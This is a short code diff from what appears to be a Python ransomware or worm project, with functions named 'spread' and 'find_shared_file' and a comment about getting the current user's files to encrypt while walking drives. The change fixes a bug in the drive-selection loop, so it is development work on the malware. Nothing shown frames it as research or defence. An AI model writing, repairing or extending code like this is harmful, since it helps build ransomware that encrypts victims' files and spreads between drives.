@@ -37,7 +37,7 @@ def spread():
 def find_shared_file():
     # Get files to encrypt from current user
     for drive in drives:
-        if drive in drive:
+        if drive in drives:
             return drive
         for r, d, files in os.walk(drive):
             for file in files:
